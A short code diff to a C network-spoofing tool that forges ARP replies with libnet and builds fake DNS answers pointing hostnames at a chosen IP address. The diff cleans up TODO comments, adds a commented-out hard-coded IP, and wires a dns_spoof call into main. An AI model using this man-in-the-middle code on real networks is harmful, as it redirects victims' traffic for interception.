@@ -47,7 +47,7 @@ void* arp_spoof(void *args){
   	libnet_autobuild_arp(
     		ARPOP_REPLY,                     /* operation type       */
     		src_hw_addr->ether_addr_octet,   /* sender hardware addr */
-    		(u_int8_t*) &target_ip_addr,     /* sender protocol addr */	//TODO: check addr
+    		(u_int8_t*) &target_ip_addr,     /* sender protocol addr */
     		zero_hw_addr,                    /* target hardware addr */
     		(u_int8_t*) &zero_ip_addr,       /* target protocol addr */
     		ln);                             /* libnet context       */
@@ -108,8 +108,8 @@ unsigned int create_answer(char *host, struct dnshdr *dns_hdr, char* dns_answer,
 	unsigned char host_ip[4];
 	unsigned int size = 0;
 
-	sscanf(host, "%d.%d.%d.%d", (int *)&host_ip[0], (int *)&host_ip[1], (int *)&host_ip[2], (int *)&host_ip[3]);	//TODO: fix after arp_spoof address
-	
+	sscanf(host, "%d.%d.%d.%d", (int *)&host_ip[0], (int *)&host_ip[1], (int *)&host_ip[2], (int *)&host_ip[3]);
+	//sscanf("51.254.121.149", "%d.%d.%d.%d", (int *)&host_ip[0], (int *)&host_ip[1], (int *)&host_ip[2], (int *)&host_ip[3]);	//adw1n.com
 	//header
 	memcpy(&dns_answer[0], dns_hdr->id, 2);	//id
 	memcpy(&dns_answer[2], "\x81\x80", 2);	//flags
@@ -265,8 +265,7 @@ int main(int argc, char** argv) {
 		printf("Failed to create thread\n");
 		exit(-1);
 	}
-  	//arp_spoof(args);	//TODO: call in separate thread, infinite loop
-	dns_spoof(argv[1], argv[2]);
+	dns_spoof(args.host, args.interface);
 	
   	return EXIT_SUCCESS;
 }
